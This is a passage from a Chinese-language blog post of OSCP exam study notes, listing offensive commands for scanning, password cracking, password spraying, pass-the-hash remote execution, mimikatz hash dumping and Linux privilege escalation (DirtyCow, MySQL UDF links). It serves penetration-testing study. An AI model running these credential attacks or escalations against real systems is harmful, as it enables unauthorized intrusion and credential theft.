+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/sysconfig/network-scripts/ifcfg-eth0</span><br></pre></td></tr></table></figure>
+<p>改进版nmap扫描命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -F -T4 -Pn --top-ports 1000 xx.xx.xx.xx   //快速扫描</span><br><span class="line">nmap -A -Pn -vv -open -T4 --script vuln -p- x.x.x.x  --dns-server 10.x.x.x   //全扫描</span><br><span class="line">nmap -sU -O -p-  10.x.x.x  //UDP扫描</span><br></pre></td></tr></table></figure>
+
+<p>linux提权searchsploit</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit linux kernel 4.4.0-116    //搜索提权</span><br></pre></td></tr></table></figure>
+
+<p>john解密</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john hash --wordlist=/usr/share/wordlist/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>开启apache http服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/apache2 start    //路径在常规/var/www/html</span><br></pre></td></tr></table></figure>
+<p>pl的提权建议脚本真好用！<a href="https://github.com/jondonas/linux-exploit-suggester-2" target="_blank" rel="noopener">https://github.com/jondonas/linux-exploit-suggester-2</a><br>升级交互式tty文章：<a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/" target="_blank" rel="noopener">https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</a></p>
+<p>msf自带提权建议</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use multi/recon/local_exploit_suggester  //提权建议</span><br></pre></td></tr></table></figure>
+<p>密码喷射：<a href="https://github.com/dafthack/DomainPasswordSpray" target="_blank" rel="noopener">https://github.com/dafthack/DomainPasswordSpray</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass</span><br><span class="line">Import-Module DomainPasswordSpray.ps1</span><br><span class="line">Invoke-DomainPasswordSpray -Password Spring2017password</span><br></pre></td></tr></table></figure>
+
+<p>psexec.py使用方法1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.py -hashes xxxxx:xxxxx domain.com/username@10.x.x.x cmd   //最后cmd为开启cmdshell。也可换成whoami等命令   //也可不用hash用密码   //注意斜杠不是反斜杠</span><br></pre></td></tr></table></figure>
+<p>pth-winexe使用方法1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pth-winexe -U domain.com/username%password or hash //10.x.x.x ipconfig</span><br></pre></td></tr></table></figure>
+
+<p>rdesktop共享文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 10.x.x.x -r disk:aaa=/home/username/</span><br></pre></td></tr></table></figure>
+
+<p>john爆破kirbi密码（krb5tgs类型）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --format=krb5tgs hash.txt --wordlist=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+<p>老版本的mimikatz抓hash（但凡新版本出现error：key import就用老版本试试）</p>
+<p>多关注web中的JS、中间件的信息、ID靠后的的linux用户！</p>
+<p>善用google</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">当ssh出现</span><br><span class="line">Unable to negotiate with 10.11.1.141 port 21: n0 matching key exchange method found,Their offer: dffie-hellman-group-exchange-sha1, iffie-hellman-group14-sha1,diffie-hellman-group1-sha1</span><br><span class="line">错误的时候，可以在~/.ssh/config里添加：</span><br><span class="line">Host 10.11.1.136</span><br><span class="line">        KexAlgorithms +diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1</span><br></pre></td></tr></table></figure>
+
+<p>具有suid位的二进制程序，可以看看其中ascll码说明了什么东西</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings xxx</span><br></pre></td></tr></table></figure>
+<p>如果其中有命令的话可以替换对应命令</p>
+<p>nmap枚举漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=(对应的服务)* -p(对应的端口)  xx.x.x.x</span><br></pre></td></tr></table></figure>
+<p>dirtycow脏牛提权时，最好有普通用户权限，不然有cc1莫名错误<br>好用的dirtycow脏牛链接<br><a href="https://github.com/FireFart/dirtycow/blob/master/dirty.c" target="_blank" rel="noopener">https://github.com/FireFart/dirtycow/blob/master/dirty.c</a><br>两种脏牛exp<br><img src="https://i.loli.net/2021/02/18/4wjFT5EtW1R36kD.png" alt="Image 2.png"></p>
+<p>传输文件得用443端口<br>Mysql UDF提权：<a href="https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c" target="_blank" rel="noopener">https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c</a></p>
+<p>wget 可以不带http头</p>
+<p>windows经典提权（不安全的文件权限）</p>
+<p>hashcat解密方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 /usr/share/wordlists/rockyou.txt -m 1600 1 --show</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/OSCP/" rel="tag"><i class="fa fa-tag"></i> OSCP</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+                <a href="/2021/02/18/OSCP%E6%BA%A2%E5%87%BA%E9%A2%98%E6%AD%A5%E9%AA%A4/" rel="next" title="OSCP溢出题步骤">
+                  <i class="fa fa-chevron-left"></i> OSCP溢出题步骤
+                </a>
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+                <a href="/2099/01/01/%E6%94%B6%E8%97%8F%E7%9A%84%E6%96%87%E7%AB%A0/" rel="prev" title="收藏的文章">
+                  收藏的文章 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    
+  <div class="comments" id="comments">
+    <div id="lv-container" data-id="city" data-uid="MTAyMC80NzQ3My8yMzk3Mw=="></div>
+  </div>
+  
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-6"><a class="nav-link" href="#JisCTF："><span class="nav-number">1.</span> <span class="nav-text">JisCTF：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Five86-2"><span class="nav-number">2.</span> <span class="nav-text">Five86-2:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#HAwordy"><span class="nav-number">3.</span> <span class="nav-text">HAwordy:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#lazysysadmin"><span class="nav-number">4.</span> <span class="nav-text">lazysysadmin:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#GitRoot"><span class="nav-number">5.</span> <span class="nav-text">GitRoot:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#powergrid"><span class="nav-number">6.</span> <span class="nav-text">powergrid:</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="LionKing"
+      src="/images/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">LionKing</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">68</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://3gstudent.github.io/" title="https:&#x2F;&#x2F;3gstudent.github.io&#x2F;" rel="noopener" target="_blank">3gstudent</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.hl0rey.com/archives/" title="https:&#x2F;&#x2F;blog.hl0rey.com&#x2F;archives&#x2F;" rel="noopener" target="_blank">hl0rey</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/micr067/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;micr067&#x2F;" rel="noopener" target="_blank">Micr067</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://patrilic.top/archives/" title="https:&#x2F;&#x2F;patrilic.top&#x2F;archives&#x2F;" rel="noopener" target="_blank">Patrilic</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://me.csdn.net/qq_29647709" title="https:&#x2F;&#x2F;me.csdn.net&#x2F;qq_29647709" rel="noopener" target="_blank">tdcoming</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://uknowsec.cn/" title="https:&#x2F;&#x2F;uknowsec.cn&#x2F;" rel="noopener" target="_blank">uknow</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://422926799.github.io/" title="https:&#x2F;&#x2F;422926799.github.io&#x2F;" rel="noopener" target="_blank">九世</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://payloads.online/" title="https:&#x2F;&#x2F;payloads.online&#x2F;" rel="noopener" target="_blank">倾旋</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://wiki.17-apt.tk/" title="https:&#x2F;&#x2F;wiki.17-apt.tk&#x2F;" rel="noopener" target="_blank">BugMan</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.se7ensec.cn/" title="http:&#x2F;&#x2F;www.se7ensec.cn&#x2F;" rel="noopener" target="_blank">se7en</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://attack.mitre.org/matrices/enterprise/" title="https:&#x2F;&#x2F;attack.mitre.org&#x2F;matrices&#x2F;enterprise&#x2F;" rel="noopener" target="_blank">ATT&CK</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.fireeye.com/blog.html" title="https:&#x2F;&#x2F;www.fireeye.com&#x2F;blog.html" rel="noopener" target="_blank">FireEye</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://vincentyiu.com/" title="https:&#x2F;&#x2F;vincentyiu.com&#x2F;" rel="noopener" target="_blank">Vincent Yiu</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">LionKing</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v4.0.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.5.0
+  </div>
+
+-->
+
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">总访客<span id="busuanzi_value_site_uv"></span>人</span>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script>
+  window.livereOptions = {
+    refer: location.pathname.replace(CONFIG.root, '').replace('index.html', '')
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+</script>
+
+</body>
+</html>
